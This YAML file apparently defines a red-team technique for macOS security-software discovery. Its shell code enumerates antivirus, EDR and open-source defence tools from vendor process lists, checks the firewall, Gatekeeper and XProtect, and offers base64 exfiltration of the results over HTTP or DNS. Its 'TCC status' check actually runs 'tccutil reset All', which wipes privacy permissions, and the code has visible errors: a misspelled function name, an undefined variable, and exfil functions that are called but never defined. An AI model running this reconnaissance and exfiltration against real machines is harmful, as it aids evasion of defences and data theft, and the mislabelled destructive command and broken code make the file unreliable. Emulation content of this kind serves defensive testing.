attack_technique: T1518.001
display_name: Security Software Discovery

input_arguments:
  verbose:
    description: "Enable verbose output"
    type: boolean
    default: false
  log:
    description: "Enable logging of output to a file"
    type: boolean
    default: false
  all:
    description: "Run all security software checks"
    type: boolean
    default: false
  edr:
    description: "Check specific EDR component"
    type: string
    default: ""
  fw:
    description: "Check firewall status"
    type: boolean
    default: false
  hids:
    description: "Discover HIDS"
    type: boolean
    default: false
  av:
    description: "Check specific av component"
    type: string
    default: ""
  gk:
    description: "Check Gatekeeper status"
    type: boolean
    default: false
  xp:
    description: "Check XProtect status"
    type: boolean
    default: false
  mrt:
    description: "Check specific MRT component"
    type: string
    default: ""
  tcc:
    description: "Check TCC status"
    type: boolean
    default: false
  ost:
    description: "Check specific opensource security tool components"
    type: string
    default: ""
  encode:
    description: "Encode output"
    type: string
    default: "none"
  encrypt:
    description: "Encrypt output"
    type: string
    default: "none"
  exfil:
    description: "Exfiltrate output"
    type: string
    default: ""
  chunksize:
    description: "Set chunk size for exfiltration"
    type: integer
    default: 1000
  sudo:
    description: "Enable sudo mode for operations requiring elevated privileges"
    type: boolean
    default: false

script_command:
  sh:
    command: |
      ./security_software.sh #{verbose} #{log} #{all} #{edr} #{fw} #{hids} #{av} #{gk} #{xp} #{mrt} #{tcc} #{ost} #{encode} #{encrypt} #{exfil} #{chunksize} #{sudo}


command_function:
  - name: cmd_ls_app_files
    description: "List application files"
    elevation_required: false
    command: |
      "$CMD_LS_APP_FILES""$1" 2>/dev/null

  - name: cmd_ls_app_dir
    description: "List application directories"
    elevation_required: false
    command: |
      "$CMD_LS_APP_DIR""$1" 2>/dev/null

  - name: cmd_ps
    description: "List processes"
    elevation_required: false
    command: |
      eval "$CMD_PS '$1'" 2>&1

  - name: cmd_sp_app
    description: "Get application info"
    elevation_required: false
    command: |
      eval "$CMD_SP_APP '$1'"  2>&1

  discover_av:
    description: "Discover av software"
    code: |
      discover_av() {
          local check_type="$1"
          local output=""

          case "$check_type" in
              "ps")
                  output+="Process Check:\n"
                  for entry in "${AV_VENDOR_PROC[@]}"; do
                      procs="${entry#*:}"
                      for proc in ${procs//,/ }; do
                          result=$(cmd_ps "$proc")
                          if [ -n "$result" ]; then
                              output+="$result\n"
                          fi
                      done
                  done
                  ;;
              "files")
                  output+="Files Check:\n"
                  for app_name in "${AV_VENDOR_APP[@]}"; do
                      result=$(cmd_ls_app_files "$app_name")
                      if [ -n "$result" ]; then
                          output+="$result\n"
                      fi
                  done
                  ;;
              "dir")
                  output+="Directory Check:\n"
                  for app_name in "${AV_VENDOR_APP[@]}"; do
                      result=$(cmd_ls_app_dir "$app_name")
                      if [ -n "$result" ]; then
                          output+="$result\n"
                      fi
                  done
                  ;;
              "info")
                  output+="Info Check:\n"
                  for app_name in "${AV_VENDOR_APP[@]}"; do
                      if app_path=$(cmd_ls_app_dir "$app_name"); then
                          app_name_colon="${app_name/.app/:}"
                          result=$(cmd_sp_app "$app_name_colon")
                          if [ -n "$result" ]; then
                              output+="$result\n"
                          fi
                      fi
                  done
                  ;;
              *)
                  output+="Unknown check type: $discover_type\n"
                  ;;
          esac

          echo "$output"
      }

  discover_edr:
    description: "Discover EDR solutions"
    code: |
      discover_edr() {
          local check_type="$1"
          local output=""

          case "$check_type" in
              "ps")
                  for entry in "${EDR_VENDOR_PROC[@]}"; do
                      procs="${entry#*:}"
                      for proc in ${procs//,/ }; do
                          result=$(cmd_ps "$proc")
                          if [ -n "$result" ]; then
                              output+="$result"$'\n'
                          fi
                      done
                  done
                  ;;
              "files")
                  for edr_name in "${EDR_VENDOR_APP[@]}"; do
                      result=$(cmd_ls_app_files "$edr_name")
                      if [ -n "$result" ]; then
                          output+="$result"$'\n'
                      fi
                  done
                  ;;
              "dir")
                  for edr_name in "${EDR_VENDOR_APP[@]}"; do
                      result=$(cmd_ls_app_dir "$edr_name")
                      if [ -n "$result" ]; then
                          output+="$result"$'\n'
                      fi
                  done
                  ;;
              "info")
                  for edr_name in "${EDR_VENDOR_APP[@]}"; do
                      if cmd_ls_app_dir "$edr_name" > /dev/null 2>&1; then
                          edr_name_colon="${edr_name/.app/:}"
                          result=$(cmd_sp_app "$edr_name_colon")
                          if [ -n "$result" ]; then
                              output+="$result"$'\n'
                          fi
                      fi
                  done
                  ;;
              *)
                  output+="Unknown check type: $check_type"$'\n'
                  ;;
          esac

          echo "$output"
      }

  discover_ost:
    description: "Discover open-source security tools"
    code: |
      disover_ost() {
          local check_type="$1"
          local output=""

          case "$check_type" in
              "ps")
                  for entry in "${OST_PROC[@]}"; do
                      procs="${entry#*:}"
                      for proc in ${procs//,/ }; do
                          result=$(cmd_ps "$proc")
                          if [ -n "$result" ]; then
                              output+="$result"$'\n'
                          fi
                      done
                  done
                  ;;
              "files")
                  for ost_name in "${OST_APP[@]}"; do
                      result=$(cmd_ls_app_files "$ost_name")
                      if [ -n "$result" ]; then
                          output+="$result"$'\n'
                      fi
                  done
                  ;;
              "dir")
                  for ost_name in "${OST_APP[@]}"; do
                      result=$(cmd_ls_app_dir "$ost_name")
                      if [ -n "$result" ]; then
                          output+="$result"$'\n'
                      fi
                  done
                  ;;
              "info")
                  for ost_name in "${OST_APP[@]}"; do
                      if cmd_ls_app_dir "$ost_name" > /dev/null 2>&1; then
                          ost_name_colon="${ost_name/.app/:}"
                          result=$(cmd_sp_app "$ost_name_colon")
                          if [ -n "$result" ]; then
                              output+="$result"$'\n'
                          fi
                      fi
                  done
                  ;;
              *)
                  output+="Unknown check type: $check_type"$'\n'
                  ;;
          esac

          echo "$output"
      }

  discover_firewall:
    description: "Discover firewall status"
    code: |
      discover_firewall() {
          local output=""
          output+="Firewall Status:\n"
          output+=$(sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null)
          echo "$output"
      }

  discover_gatekeeper:
    description: "Discover Gatekeeper status"
    code: |
      discover_gatekeeper() {
          local output=""
          output+="Gatekeeper Status:\n"
          output+=$(spctl --status 2>&1)
          echo "$output"
      }

  discover_xprotect:
    description: "Discover XProtect status"
    code: |
      discover_xprotect() {
          local output=""
          output+="XProtect Status:\n"
          output+=$(system_profiler SPInstallHistoryDataType | grep -i xprotect)
          echo "$output"
      }

  discover_mrt:
    description: "Discover Malware Removal Tool status"
    code: |
      discover_mrt() {
          local check_type="$1"
          local output=""

          case "$check_type" in
              "ps")
                  output+="MRT Process Check:\n"
                  output+=$(cmd_ps "MRT")
                  ;;
              "files")
                  output+="MRT Files Check:\n"
                  output+=$(ls -l /System/Library/CoreServices/MRT.app 2>/dev/null)
                  ;;
              "config")
                  output+="MRT Configuration:\n"
                  output+=$(defaults read /System/Library/CoreServices/MRT.app/Contents/version.plist 2>/dev/null)
                  ;;
              *)
                  output+="Unknown check type: $check_type\n"
                  ;;
          esac

          echo "$output"
      }

  discover_tcc:
    description: "Discover TCC status"
    code: |
      discover_tcc() {
          local output=""
          output+="TCC Status:\n"
          output+=$(tccutil reset All 2>&1)
          echo "$output"
      }

  discover_hids:
    description: "Discover HIDS"
    code: |
      discover_hids() {
          local output=""
          output+="HIDS Check:\n"
          # Add HIDS discovery logic here
          echo "$output"
      }

main_function:
  description: "Main function to orchestrate security software checks"
  code: |
    main() {
        local output=""
        local separator=$'\n---\n'
        
        if [ "$LOG_ENABLED" = true ]; then
            setup_log
        fi
        
        # Validation
        if [ "$EXFIL" = true ] && [[ "$EXFIL_METHOD" == dns=* ]]; then
            validate_dns
        fi
        if [ -n "$ENCODE" ]; then
            validate_encoding
        fi
        if [ -n "$ENCRYPT" ]; then
            validate_encryption
        fi
        if [ -n "$CHUNK_SIZE" ]; then
            validate_chunk_size
        fi
        if [ "$SUDO_MODE" = true ]; then
            validate_sudo_mode
        fi
        if [ "$VERBOSE" = true ]; then
            validate_verbose_mode
        fi
        validate_security_checks
        if [ "$LOG_ENABLED" = true ]; then
            validate_log_enabled
        fi
        
        # Technique Function Execution
        if [ "$ALL" = true ] || [ -n "${EDR[*]}" ] || [ ${#AV[@]} -gt 0 ] || [ "$FIREWALL" = true ] || 
           [ ${#MRT[@]} -gt 0 ] || [ "$GATEKEEPER" = true ] || [ "$XPROTECT" = true ] || 
           [ "$TCC" = true ] || [ ${#OST[@]} -gt 0 ] || [ "$LOG_ENABLED" = true ]; then
            
            if [ -n "$EDR" ]; then
                output+="${separator}EDR Check:${separator}"
                output+=$(discover_edr "$EDR")
            fi
            
            for av_tool in "${AV[@]}"; do
                output+="${separator}Antivirus Check ($av_tool):${separator}"
                output+=$(discover_av "$av_tool")
            done
            
            if [ "$FIREWALL" = true ]; then
                output+="${separator}Firewall Check:${separator}"
                output+=$(discover_firewall)
            fi
            
            if [ -n "$MRT" ]; then
                output+="${separator}MRT Check:${separator}"
                output+=$(discover_mrt "$MRT")
            fi
            
            if [ "$GATEKEEPER" = true ]; then
                output+="${separator}Gatekeeper Check:${separator}"
                output+=$(discover_gatekeeper)
            fi
            
            if [ "$XPROTECT" = true ]; then
                output+="${separator}XProtect Check:${separator}"
                output+=$(discover_xprotect)
            fi
            
            if [ "$TCC" = true ]; then
                output+="${separator}TCC Check:${separator}"
                output+=$(discover_tcc)
            fi
            
            for ost_tool in "${OST[@]}"; do
                output+="${separator}OST Check ($ost_tool):${separator}"
                output+=$(discover_ost "$ost_tool")
            done
            
            if [ "$HIDS" = true ]; then
                output+="${separator}HIDS Check:${separator}"
                output+=$(discover_hids)
            fi
        else
            display_help
            exit 0
        fi
        
        # Output Processing
        if [ -n "$output" ]; then
            if [ "$ENCODE" != "none" ]; then
                encoded_output=$(encode_output "$output")
            fi
            
            if [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ]; then
                if [ -n "$encoded_output" ]; then
                    echo "$encoded_output" >> "$LOG_FILE"
                else
                    echo "$output" >> "$LOG_FILE"
                fi
            elif [ "$LOG_ENABLED" != true ]; then
                if [ -n "$encoded_output" ]; then
                    echo "$encoded_output"
                else
                    echo "$output"
                fi
            fi
            
            if [ "$EXFIL" = true ]; then
                local exfil_data=$([ -n "$encoded_output" ] && echo "$encoded_output" || echo "$output")
                local b64_output=$(echo "$exfil_data" | base64)
                if [[ "$EXFIL_METHOD" == http://* ]]; then
                    exfil_http "$b64_output" "$EXFIL_METHOD"
                elif [[ "$EXFIL_METHOD" == dns=* ]]; then
                    local domain="${EXFIL_METHOD#dns=}"
                    exfil_dns "$b64_output" "$domain" "$(date +%s)"
                fi
            fi
        else
            [ "$LOG_ENABLED" != true ] && echo "No security software information found"
        fi
    }

global_variables:
  AV_VENDOR_PROC:
    - "MacKeeper:MacKeeper,MacKeeperAgent,com.mackeeper.MacKeeperPrivilegedHelper"
    - "Malwarebytes:RTProtectionDaemon,FrontendAgent,SettingsDaemon"
    - "Avast:AvastUI"
    - "AvastBusinessAntivirusforMac:AvastBusinessUI"
    - "AvastFreeAntivirusforMac:AvastFreeUI"
    - "AvastSecurity:AvastSecurityUI"
    - "Avira:AviraUI"
    - "AviraAntivirus:AviraAntivirusUI"
    - "AviraFreeAntivirusforMac:AviraFreeUI"
    - "Bitdefender:bdmd"
    - "BitdefenderAntivirusforMac:bdmd"
    - "BitdefenderAntivirusFree:bdmd"
    - "BitdefenderGravityZone:bdmd"
    - "ESET:ec_service"
    - "ESETCyberSecurityforMac:ec_service"
    - "ESETNOD32:ESETNOD32Service"
    - "F-SecureElements:FSElementsService"
    - "Kaspersky:kavsvc"
    - "KasperskyFreeAntivirusforMac:kavsvc"
    - "KasperskySecurityCloud:kavsvc"
    - "MicrosoftDefender:Defender"
    - "Norton360:Norton360Service"
    - "PandaAdaptiveDefense:PandaAdaptiveService"
    - "PandaSecurity:PandaService"
    - "Proofpoint:ProofpointAgent"
    - "Webroot:WRSAService"
    - "WebrootBusinessEndpointProtection:WRBusinessService"
    - "WebrootSecureAnywhere:WRSAService"

  AV_VENDOR_APP:
    - "MacKeeper.app"
    - "Avast.app"
    - "AvastBusiness.app"
    - "AvastFree.app"
    - "AvastSecurity.app"
    - "Avira.app"
    - "AviraAntivirus.app"
    - "AviraFree.app"
    - "Bitdefender.app"
    - "BitdefenderMac.app"
    - "BitdefenderFree.app"
    - "GravityZone.app"
    - "ESET.app"
    - "CyberSecurity.app"
    - "NOD32.app"
    - "F-Secure.app"
    - "Elements.app"
    - "Kaspersky.app"
    - "KasperskyFree.app"
    - "SecurityCloud.app"
    - "Microsoft Defender.app"
    - "Norton360.app"
    - "PandaAdaptive.app"
    - "Panda.app"
    - "Proofpoint.app"
    - "Webroot.app"
    - "WebrootBusiness.app"
    - "WebrootSecureAnywhere.app"
    - "Malwarebytes.app"

  EDR_VENDOR_PROC:
    - "CrowdStrike:falconctl,falcon-sensor"
    - "CarbonBlack:cbdaemon,cbagent"
    - "SentinelOne:SentinelAgent,SentinelService"
    - "Cylance:CylanceSvc,CylanceUI"
    - "FireEye:FireEyeAgent,FireEyeService"
    - "CiscoAMP:ampdaemon,ampservice"
    - "PaloAlto:CortexService,TrapsService"
    - "MicrosoftDefender:mds,mdatp"
    - "TrendMicroApexOne:ds_agent,tmlisten"
    - "SophosInterceptX:sophosd,sophosservice"
    - "McAfee:mcafeeagent,mcafeed"

  EDR_VENDOR_APP:
    - "CrowdStrike.app"
    - "CarbonBlack.app"
    - "SentinelOne.app"
    - "Cylance.app"
    - "FireEye.app"
    - "CiscoAMP.app"
    - "Cortex XDR.app"
    - "Microsoft Defender.app"
    - "TrendMicroSecurity.app"
    - "Sophos_Endpoint.app"
    - "McAfee _ndpoint Security for Mac.app"

  OST_PROC:
    - "BlockBlock:blockblock"
    - "DoNotDisturb:DoNotDisturb"
    - "LuLu:LuLu"
    - "KnockKnock:KnockKnockDaemon"
    - "OverSight:OverSight"
    - "RansomWhere:RansomWhere"

  OST_APP:
    - "BlockBlock.app"
    - "DoNotDisturb.app"
    - "LuLu.app"
    - "KnockKnock.app"
    - "OverSight.app"
    - "RansomWhere.app"